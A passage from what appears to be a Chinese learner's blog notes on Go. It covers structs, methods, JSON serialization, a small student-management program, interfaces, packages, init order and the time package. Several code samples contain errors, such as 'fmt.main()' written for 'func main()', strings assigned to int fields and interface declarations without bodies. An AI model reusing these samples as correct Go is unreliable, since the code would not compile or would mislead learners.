spellcheck="true">//定义一个新的类型名为person根本的类型为struct类型也就是结构体类型</span></code></pre><p>Go语言中对于一个结构体中的变量名的调用语法为：</p><pre class=" language-go"><code class="language-go">person<span class="token punctuation">.</span>name<span class="token operator">=</span><span class="token string">"wdnmd"</span>               <span class="token comment" spellcheck="true">//将wdnmd赋值给person这个结构体中的name变量</span></code></pre><p>总体的语法同c语言相差不大</p><h3 id="匿名结构体"><a href="#匿名结构体" class="headerlink" title="匿名结构体"></a>匿名结构体</h3><p>语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> s <span class="token keyword">struct</span><span class="token punctuation">{</span>    x <span class="token builtin">int</span>    y <span class="token builtin">string</span><span class="token punctuation">}</span>s<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">18</span>s<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token string">"wdnmd"</span></code></pre><p>匿名结构体主要用于临时，不建议在函数外单独定义</p><h3 id="结构体指针："><a href="#结构体指针：" class="headerlink" title="结构体指针："></a>结构体指针：</h3><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> p <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span>person<span class="token punctuation">)</span>              申请了一个person类型的指针</code></pre><pre class=" language-go"><code class="language-go">p<span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token function">18</span><span class="token punctuation">(</span><span class="token operator">*</span>p<span class="token punctuation">)</span><span class="token punctuation">.</span>x <span class="token operator">=</span> <span class="token number">18</span>                      <span class="token comment" spellcheck="true">//以上两个语句所表达的意思均相同，因为p为指针类型，且存储的数据为地址，</span><span class="token comment" spellcheck="true">//我们在使用p.x=18时Go语言会自动帮我们转义为(*p).x=18</span></code></pre><p>声明一个person指针类型的变量f并进行初始化</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> f <span class="token operator">=</span><span class="token operator">&amp;</span>person<span class="token punctuation">{</span>    name<span class="token punctuation">:</span> <span class="token string">"wdnmd"</span><span class="token punctuation">,</span>    age <span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">,</span><span class="token punctuation">}</span></code></pre><p>声明一个person指针类型的变量m并进行初始化，初始化时所附的值一定要与person类型中定义的顺序相同</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> m <span class="token operator">=</span><span class="token operator">&amp;</span>person<span class="token punctuation">{</span>    <span class="token string">"wdnmd"</span><span class="token punctuation">,</span>    <span class="token string">"18"</span><span class="token punctuation">,</span><span class="token punctuation">}</span></code></pre><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><p>语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>p person<span class="token punctuation">)</span> <span class="token function">people</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"%s:wdnmd"</span><span class="token punctuation">,</span> p<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>方法是作用于特定类型的函数，在以上实例的(p person)中的person表示能够调用当前方法的类型为person类型，p表示一个形参，也就是我们调用person类型时所赋值的变量。</p><h3 id="结构体的嵌套"><a href="#结构体的嵌套" class="headerlink" title="结构体的嵌套"></a>结构体的嵌套</h3><p>我们在使用多个结构体时，会对同一个或者多个变量进行了多次的声明，这时我们可以使用结构体的嵌套，来进行一次声明，多次使用</p><p>语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> person <span class="token keyword">struct</span><span class="token punctuation">{</span>    name <span class="token builtin">string</span>    age <span class="token builtin">int</span>    addr address<span class="token punctuation">}</span>                        <span class="token comment" spellcheck="true">//定义一个person的结构体,调用了address的类型</span><span class="token keyword">type</span> company <span class="token keyword">struct</span><span class="token punctuation">{</span>    name <span class="token builtin">string</span>    add address<span class="token punctuation">}</span>                        <span class="token comment" spellcheck="true">//定义了一个company的结构体，调用了address的类型</span><span class="token keyword">type</span> address <span class="token keyword">struct</span><span class="token punctuation">{</span>    province <span class="token builtin">string</span>    city    <span class="token builtin">string</span><span class="token punctuation">}</span>                       <span class="token comment" spellcheck="true">//定义了一个address的结构体，用于嵌套使用</span>fmt<span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    p1 <span class="token operator">:=</span> person<span class="token punctuation">{</span>        name<span class="token punctuation">:</span><span class="token string">"wdnmd"</span><span class="token punctuation">,</span>        age<span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">,</span>        addr<span class="token punctuation">{</span>            province<span class="token punctuation">:</span><span class="token string">"上海"</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>addr<span class="token punctuation">.</span>province<span class="token punctuation">)</span><span class="token punctuation">}</span>                       <span class="token comment" spellcheck="true">//定义了一个p1的变量，类型为person类型，其中调用了addr的结构体嵌套</span></code></pre><h4 id="匿名嵌套结构体"><a href="#匿名嵌套结构体" class="headerlink" title="匿名嵌套结构体"></a>匿名嵌套结构体</h4><p>语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> person <span class="token keyword">struct</span><span class="token punctuation">{</span>    name <span class="token builtin">string</span>    age <span class="token builtin">int</span>    address<span class="token punctuation">}</span>                        <span class="token comment" spellcheck="true">//定义一个person的结构体,调用了address的类型,其中address类型并没有用变量声明</span><span class="token keyword">type</span> company <span class="token keyword">struct</span><span class="token punctuation">{</span>    name <span class="token builtin">string</span>    address<span class="token punctuation">}</span>                        <span class="token comment" spellcheck="true">//定义了一个company的结构体，调用了address的类型,其中address类型并没有用变量声明</span><span class="token keyword">type</span> address <span class="token keyword">struct</span><span class="token punctuation">{</span>    province <span class="token builtin">string</span>    city    <span class="token builtin">string</span><span class="token punctuation">}</span>                       <span class="token comment" spellcheck="true">//定义了一个address的结构体，用于嵌套使用</span>fmt<span class="token punctuation">.</span><span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    p1 <span class="token operator">:=</span> person<span class="token punctuation">{</span>        name<span class="token punctuation">:</span><span class="token string">"wdnmd"</span><span class="token punctuation">,</span>        age<span class="token punctuation">:</span><span class="token string">"18"</span><span class="token punctuation">,</span>        address<span class="token punctuation">{</span>            province<span class="token punctuation">:</span><span class="token string">"上海"</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>province<span class="token punctuation">)</span><span class="token punctuation">}</span>                       <span class="token comment" spellcheck="true">//定义了一个p1的变量，类型为person类型，</span><span class="token comment" spellcheck="true">//其中调用了addr的结构体嵌套,可以直接利用语法p1.province来调用province的值</span></code></pre><h3 id="结构体中的类似继承"><a href="#结构体中的类似继承" class="headerlink" title="结构体中的类似继承"></a>结构体中的类似继承</h3><p>语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> person <span class="token keyword">struct</span><span class="token punctuation">{</span>    age <span class="token builtin">int</span>    name <span class="token builtin">string</span>    <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">type</span> addr <span class="token keyword">struct</span><span class="token punctuation">{</span>    province <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//此时person类型中已经具有了addr类型，</span><span class="token comment" spellcheck="true">//如果addr类型具有方法函数的话，person中的函数也能够调用addr中的方法函数</span></code></pre><h3 id="结构体序列化与反序列化"><a href="#结构体序列化与反序列化" class="headerlink" title="结构体序列化与反序列化"></a>结构体序列化与反序列化</h3><p>go语言中存在一个名为encoding/json的包能够将结构体中的内容转义为json形式的字符串具体语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span><span class="token punctuation">(</span>    <span class="token string">"fmt"</span>    <span class="token string">"encoding/json"</span><span class="token punctuation">)</span><span class="token keyword">type</span> person <span class="token keyword">struct</span><span class="token punctuation">{</span>    name <span class="token builtin">string</span>    age <span class="token builtin">int</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//创建一个person类型的结构体</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    p1<span class="token operator">:=</span> person<span class="token punctuation">{</span>        name<span class="token punctuation">:</span><span class="token string">"wdnmd"</span><span class="token punctuation">,</span>        age<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//创建一个名为p1的person类型的变量</span>    b<span class="token punctuation">,</span>err<span class="token operator">:=</span>json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">//调用json包中的Marshal函数对变量p1进行编码并将两个返回值分别赋值给b和err，其中err为错误判断的返回值</span>    <span class="token keyword">if</span> err <span class="token operator">!=</span><span class="token boolean">nil</span><span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//错误判断</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将b进行强制转换为字符串类型并打印</span><span class="token punctuation">}</span></code></pre><p>在上述的示例中，我们到最后只会得到一个{}的结果，或者在我们编译前会在Marshal函数调用p1时提示：struct doesn’t have any exported fields, nor custom marshaling (SA9005)意思是没有导出任何字段，出现这样的错误原因是，Go语言中如果想要让另一个包调用当前包中类型为结构体中已定义的变量类型（类似于上边示例中的name和age两个在结构体中声明过的），就需要将此变量的首字母大写表示此类型相对于当前包来说是公开的，也就说我们在其他包中可以调用此类型的变量中公开的类型，在上边示例中我们只需要把name和age的首字母大写就可以得到结果。</p><p>上实例代码逻辑的分析：</p><p>定义一个person类型，在main函数中定义了一个person类型的变量p1并对其进行了初始化，然后调用json包中的Marshal函数将p1作为参数传入，会得到两个返回值一个为转义后的字符串，一个为报错判断，接下来用一个if语句进行报错判断，最后将b转换类型为string类型然后打印。</p><p>在上边的代码中如果name和age的首字母没有大写那么就表示在当前的包中person类型中的name和age是不公开的，由于不公开我们传入Marshal函数中的值相当于是空，所以返回值也为空，也就导致了最后打印的结果为{}，如果将其大写那么表示当前代码中person类型中的name和age对于其他包来说是公开的，是可以被其他包调用的，所以我们此时传入了我们预期的值，最后得到了预期的效果。</p><p>如果我们想要让name和age对json这个包公开的为name而不是Name的话具体语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> person <span class="token keyword">struct</span><span class="token punctuation">{</span>    Name <span class="token builtin">string</span> <span class="token string">`json:"name" ,db:"name"`</span>  <span class="token comment" spellcheck="true">//表示如果json或者db包想要调用Name用name代替Name</span>    age <span class="token builtin">int</span> <span class="token string">`json:age ,db:age`</span><span class="token punctuation">}</span></code></pre><p>如果我们想要对一个json格式的编码进行反序列化语法为：</p><pre class=" language-go"><code class="language-go">str <span class="token operator">:=</span> <span class="token string">`{"name":"wdnmd","age":18}`</span><span class="token keyword">var</span> p2 personjson<span class="token punctuation">.</span><span class="token function">Unmarshal</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>p2<span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span>p2<span class="token punctuation">)</span></code></pre><p>以上示例中Unmarshal函数用法为将str变量进行强制转换然后将转换后的值，传给p2，而传指针是为在Unmarshal函数中修改p2的值</p><h3 id="结构体示例简单的学生信息管理系统"><a href="#结构体示例简单的学生信息管理系统" class="headerlink" title="结构体示例简单的学生信息管理系统"></a>结构体示例简单的学生信息管理系统</h3><p>main.go内容如下：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">var</span> smr studentMan<span class="token keyword">func</span> <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"1.增加学生信息"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"2.查看所有学生信息"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"3.删除学生信息"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"4.修改学生信息"</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"你的选择："</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    smr <span class="token operator">=</span> studentMan<span class="token punctuation">{</span>        allstudent<span class="token punctuation">:</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int64</span><span class="token punctuation">]</span><span class="token operator">*</span>student<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">{</span>        <span class="token function">menu</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">var</span> chioce <span class="token builtin">int</span>        fmt<span class="token punctuation">.</span><span class="token function">Scanln</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>chioce<span class="token punctuation">)</span>        <span class="token keyword">switch</span> chioce <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>            smr<span class="token punctuation">.</span><span class="token function">addstudent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>            smr<span class="token punctuation">.</span><span class="token function">showstudent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> <span class="token number">3</span><span class="token punctuation">:</span>            smr<span class="token punctuation">.</span><span class="token function">deletestudent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token punctuation">:</span>            smr<span class="token punctuation">.</span><span class="token function">editstudent</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"请重新输入"</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>student.go内容如下：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span>    <span class="token string">"fmt"</span><span class="token punctuation">)</span><span class="token keyword">type</span> student <span class="token keyword">struct</span> <span class="token punctuation">{</span>    id   <span class="token builtin">int64</span>    name <span class="token builtin">string</span><span class="token punctuation">}</span><span class="token keyword">type</span> studentMan <span class="token keyword">struct</span> <span class="token punctuation">{</span>    allstudent <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">int64</span><span class="token punctuation">]</span><span class="token operator">*</span>student<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s studentMan<span class="token punctuation">)</span> <span class="token function">addstudent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token punctuation">(</span>        Id   <span class="token builtin">int64</span>        name <span class="token builtin">string</span>    <span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"请输入学号："</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Scanln</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Id<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"请输入姓名："</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Scanln</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>name<span class="token punctuation">)</span>    strnew <span class="token operator">:=</span> <span class="token function">newstudent</span><span class="token punctuation">(</span>Id<span class="token punctuation">,</span> name<span class="token punctuation">)</span>    smr<span class="token punctuation">.</span>allstudent<span class="token punctuation">[</span>Id<span class="token punctuation">]</span> <span class="token operator">=</span> strnew<span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token function">newstudent</span><span class="token punctuation">(</span>id <span class="token builtin">int64</span><span class="token punctuation">,</span> name <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span>student <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token operator">&amp;</span>student<span class="token punctuation">{</span>        id<span class="token punctuation">:</span>   id<span class="token punctuation">,</span>        name<span class="token punctuation">:</span> name<span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s studentMan<span class="token punctuation">)</span> <span class="token function">showstudent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> v <span class="token operator">:=</span> <span class="token keyword">range</span> s<span class="token punctuation">.</span>allstudent <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"学号：%d 姓名：%s\n"</span><span class="token punctuation">,</span> v<span class="token punctuation">.</span>id<span class="token punctuation">,</span> v<span class="token punctuation">.</span>name<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s studentMan<span class="token punctuation">)</span> <span class="token function">deletestudent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"输入删除学生学号"</span><span class="token punctuation">)</span>    <span class="token keyword">var</span> card <span class="token builtin">int64</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"学号："</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Scanln</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>card<span class="token punctuation">)</span>    <span class="token function">delete</span><span class="token punctuation">(</span>smr<span class="token punctuation">.</span>allstudent<span class="token punctuation">,</span> card<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">func</span> <span class="token punctuation">(</span>s studentMan<span class="token punctuation">)</span> <span class="token function">editstudent</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> <span class="token punctuation">(</span>        stuid <span class="token builtin">int64</span>        name  <span class="token builtin">string</span>    <span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"请输入需要修改的学生学号："</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Scanln</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>stuid<span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"学生姓名："</span><span class="token punctuation">)</span>    fmt<span class="token punctuation">.</span><span class="token function">Scanln</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>name<span class="token punctuation">)</span>    strnew <span class="token operator">:=</span> <span class="token function">newstudent</span><span class="token punctuation">(</span>stuid<span class="token punctuation">,</span> name<span class="token punctuation">)</span>    smr<span class="token punctuation">.</span>allstudent<span class="token punctuation">[</span>stuid<span class="token punctuation">]</span> <span class="token operator">=</span> strnew<span class="token punctuation">}</span></code></pre><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p>接口的定义：</p><p>（本人暂时搞不懂）</p><p>定义一个接口，语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> speaker <span class="token keyword">interface</span>    <span class="token comment" spellcheck="true">//定义一个名为speaker的接口类型</span></code></pre><p>定义一个传入参数为接口类型的函数：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">wdnmd</span><span class="token punctuation">(</span>x <span class="token keyword">interface</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    x<span class="token punctuation">.</span><span class="token function">speaker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//此函数传入的参数不会管你传入的参数是什么，唯一关心的是你传入的参数中是否含有speaker这个方法</span></code></pre><p>如果我们定义了一个接口类型的变量s，定义一个person类型的变量a（person是我们自己定义的一个结构体类型），然后传入参数给此变量，然后我们会发现变量s的类型会变为person，这是因为接口为了实现对不同类型的传入变量进行统一进行方法的运算，在定义一个接口类型的变量时，变量的动态类型和动态值均为nil，在上述例子中变量s的初始类型和初始值均为nil，我们在传入变量a的同时也将变量a的类型传入了进去，让s变量的动态类型为person动态值为a的值。</p><h3 id="值接收者和指针接收者"><a href="#值接收者和指针接收者" class="headerlink" title="值接收者和指针接收者"></a>值接收者和指针接收者</h3><p>结构体的方法参数分为值接收和指针接收，两者的区别为：</p><p>值接收者能够接收指针和数据类型，而指针接收者只能接收指针。代码层面最根本的差别是方法传入参数的差别，在平常的使用中最常见的是指针接收者</p><h3 id><a href="#" class="headerlink" title></a></h3><p>如果想要对一个结构体实现多个接口，只需定义不同的方法再分别用不同的接口函数进行调用就可实现一个结构体对应多个接口。同时，接口之间可以进行嵌套，示例：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">type</span> s <span class="token keyword">interface</span><span class="token punctuation">{</span>    mover    driver<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义了名为s的一个接口，内部调用了其它接口</span><span class="token keyword">type</span> mover <span class="token keyword">interface</span><span class="token punctuation">{</span>    <span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义了一个名为mover的接口，内部调用了move方法</span><span class="token keyword">type</span> driver <span class="token keyword">interface</span><span class="token punctuation">{</span>    <span class="token function">drive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义了一个名为driver的接口，内部调用了drive方法</span></code></pre><h3 id="空接口"><a href="#空接口" class="headerlink" title="空接口"></a>空接口</h3><p>空接口表示为能够接收任何类型的变量，因为空接口内部没有对方法进行限制，也就意味着任何结构体都能够实现这个接口，语法为：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//定义了一个空接口</span></code></pre><p>空接口与map的组合：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">var</span> s1 <span class="token operator">=</span> <span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span><span class="token keyword">interface</span><span class="token punctuation">{</span><span class="token punctuation">}</span> <span class="token comment" spellcheck="true">//定义了一个名为s1的map类型的变量，其中key的类型为string，value的类型为interface </span></code></pre><h2 id="包（package）"><a href="#包（package）" class="headerlink" title="包（package）"></a>包（package）</h2><p>Go 语言的源码复用建立在包（package）基础之上。Go 语言的入口 main() 函数所在的包（package）叫 main，main 包想要引用别的代码，必须同样以包的方式进行引用，本章内容将详细讲解如何导出包的内容及如何导入其他包。 ——引自他人解释</p><p>定义一个包名：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">package</span> 包名    </code></pre><p>在同一文件夹下只能有一个main包，同时所有的也只能有一个main函数，Go语言程序是以你的main包中的main函数作为入口开始运行的。</p><p>导入包：</p><pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"包的位置"</span> <span class="token comment" spellcheck="true">//包的位置默认是从GOPATH下的src文件开始一级一级的往下找包的所在位置</span></code></pre><p>注意：</p><p>在调用的包中，如果我们想要调用包中的某一个函数则需要将函数的首字母大写表示此函数是公开的。</p><p>Go语言中禁止循环导入包，两个包之间禁止互相导入。</p><h3 id="匿名导入包"><a href="#匿名导入包" class="headerlink" title="匿名导入包"></a>匿名导入包</h3><pre class=" language-go"><code class="language-go"><span class="token keyword">import</span> <span class="token boolean">_</span><span class="token string">"包的位置"</span>    <span class="token comment" spellcheck="true">//表示匿名导入包，相当于导入了这个包但没有使用这个包中的任何方法</span></code></pre><h3 id="init函数"><a href="#init函数" class="headerlink" title="init函数"></a>init函数</h3><pre class=" language-go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    语法<span class="token punctuation">}</span><span class="token comment" spellcheck="true">//表示在调用这个包时就会自动调用这个函数中的内容</span></code></pre><p>init函数不能主动调用，同时init函数没有参数和返回值，只能在程序运行时自动调用</p><p>函数执行顺序：</p><p>全局变量的声明—&gt;init函数执行—&gt;main函数执行</p><p>如果一个main包调用了a包，a包中调用了b包，那么我们执行顺序则为：</p><p>全局变量的声明—&gt;b包init函数执行—&gt;a包init函数执行—&gt;main包init函数执行</p><h3 id="time包"><a href="#time包" class="headerlink" title="time包"></a>time包</h3><p>time包主要用于读取当前的时间</p><pre class=" language-go"><code class="language-go">now <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span><span class="token function">Day</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//输出当前是几号</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span><span class="token function">Year</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//输出当前是几年</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span><span class="token function">Minute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//输出当前是几分</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span><span class="token function">Second</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//输出当前是几秒</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span><span class="token function">Unix</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//获取时间戳</span></code></pre><pre class=" language-go"><code class="language-go">now <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Unix</span><span class="token punctuation">(</span>时间戳<span class="token punctuation">,</span>标志位<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//将时间戳转换为标准的时间格式</span></code></pre><p>时间的加减：</p><pre class=" language-go"><code class="language-go">fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token number">24</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Hour<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//加24小时</span><span class="token comment" spellcheck="true">//时间相减</span>td <span class="token operator">:=</span> timeobj<span class="token punctuation">.</span><span class="token function">Sub</span><span class="token punctuation">(</span>now<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//将timeobj和now相减（now-timeobj）最后得到一个时间间隔类型的数据赋值给td变量</span></code></pre><p>计时器：</p><pre class=" language-go"><code class="language-go">wd <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Tick</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Second<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//将按秒读取的时间赋值给wd变量</span>    <span class="token keyword">for</span> wt <span class="token operator">:=</span> <span class="token keyword">range</span> wd <span class="token punctuation">{</span>        fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>wt<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//循环输出时间</span></code></pre><p>时间格式化：</p><pre class=" language-go"><code class="language-go">now <span class="token operator">:=</span> time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>now<span class="token punctuation">.</span><span class="token function">Format</span><span class="token punctuation">(</span><span class="token 